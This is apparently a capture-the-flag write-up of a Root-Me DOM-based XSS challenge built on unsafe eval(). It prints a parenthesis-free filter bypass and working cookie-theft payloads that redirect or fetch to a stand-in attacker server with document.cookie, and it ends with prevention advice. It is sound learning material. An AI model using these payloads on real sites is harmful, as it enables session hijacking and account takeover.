# DOM-Based XSS - `eval()` Injection
[Root-Me Challenge proof](https://www.root-me.org/?page=validation%26id_challenge=2916%26id_auteur=1089475%26lang=en)

## Lab Overview

This lab demonstrates a **DOM-Based XSS** vulnerability caused by the unsafe use of JavaScript's `eval()` function.

The application takes user-controlled input and directly evaluates it as JavaScript code inside the browser.

Because `eval()` executes arbitrary JavaScript, an attacker can inject and run their own code.

---

# Finding the Vulnerability

Identified a reflection point where user input was passed directly into `eval()`:

```javascript
var result = eval(1+1);
document.getElementById('state').innerText =
    '1+1 = ' + result;
```
<img width="1476" height="375" alt="image" src="https://github.com/user-attachments/assets/b5bc47de-da87-490e-a7ef-0a71f4d14cc3" />

The vulnerable value comes from the URL parameter and is executed by the browser.

---

# Why `eval()` Is Dangerous

`eval()` treats its input as JavaScript code.

Example:

```javascript
eval("1+1")
```

returns:

```text
2
```

However:

```javascript
eval("alert(1)")
```

executes:

```javascript
alert(1)
```

This means any attacker-controlled input reaching `eval()` can become executable JavaScript.

---

# Initial Payload

Payload:

```javascript
1+1,alert`1`
```

Result:

```javascript
eval("1+1,alert`1`")
```

Execution:

```javascript
1+1
alert`1`
```

The alert box appeared successfully.

---

# Why Use Backticks Instead of Parentheses?

Normal syntax:

```javascript
alert(1)
```

was filtered or blocked by the challenge.

JavaScript allows **tagged template literals**:

```javascript
alert`1`
```

which is interpreted similarly to a function call.

Therefore:

```javascript
alert`1`
```

executes without requiring parentheses.

This is a common XSS filter bypass technique.

---

# Failed Payload

Attempted:

```javascript
1+1,${fetch`"http://attacker-server?="+document.cookie`}
```

This did not work.

---

# Why It Failed

`${}` only works **inside template literals**.

Valid example:

```javascript
`Hello ${document.cookie}`
```

JavaScript evaluates:

```javascript
${document.cookie}
```

only because it is inside backticks.

Your payload used:

```javascript
${fetch`...`}
```

outside of a template literal.

This causes a syntax error because JavaScript expects `${}` interpolation only within:

```javascript
`...${expression}...`
```

---

# Another Issue

Even if syntax were corrected, `fetch()` is asynchronous.

The vulnerable code expects an expression that can be evaluated immediately.

Improper template literal usage prevented the payload from executing at all.

---

# Working Payload

Payload:

```javascript
1+1`${document.location="http://attacker-server?"+document.cookie}`
```

---

# Why It Works

JavaScript evaluates:

```javascript
${document.location =
    "http://attacker-server?" + document.cookie}
```

before processing the template literal.

The expression performs:

```javascript
document.location =
    "http://attacker-server?" + document.cookie;
```

which immediately redirects the browser.

Example:

```text
http://attacker-server/?session=abc123
```

The browser sends a request containing the cookie value.

---

# Execution Flow

Injected code:

```javascript
1+1`${document.location=
"http://attacker-server?"+document.cookie}`
```

Browser actions:

```text
1. Evaluate template expression
2. Read document.cookie
3. Build attacker URL
4. Change document.location
5. Browser navigates to attacker server
6. Cookie sent within URL
```

---

# Why Redirect Worked Better Than Fetch

### Fetch

```javascript
fetch("http://attacker/?c="+document.cookie)
```

requires:

- Correct syntax
- Successful network request
- Proper execution context

Some challenges may restrict or break fetch-based payloads.

---

### Location Redirect

```javascript
document.location=
"http://attacker/?c="+document.cookie
```

is much simpler.
<img width="1205" height="391" alt="image" src="https://github.com/user-attachments/assets/de6a88cf-11a6-4731-aa41-3abdb841f201" />

Advantages:

- Executes immediately
- No callback required
- No promise handling
- Forces browser navigation

As long as JavaScript executes, the request is sent.

---

# Impact

Successful exploitation can lead to:

- Session hijacking
- Cookie theft
- Account takeover
- User impersonation
- Sensitive information disclosure

The exact impact depends on protections such as:

- HttpOnly cookies
- SameSite cookies
- Content Security Policy (CSP)

---

# Key Learnings

- Never pass user-controlled input into `eval()`.
- `eval()` converts data into executable code.
- Template literals can be used to bypass simple filters.
- Backticks may work when parentheses are blocked.
- `${}` only works inside template literals.
- DOM-Based XSS occurs entirely within browser-side JavaScript.
- Simple redirects are often more reliable than complex payloads.

---

# Prevention

Avoid:

```javascript
eval(userInput)
```

Use safer alternatives:

```javascript
Number(userInput)
parseInt(userInput)
JSON.parse()
```

Additionally:

- Validate user input
- Apply context-aware encoding
- Implement CSP
- Avoid dangerous JavaScript sinks
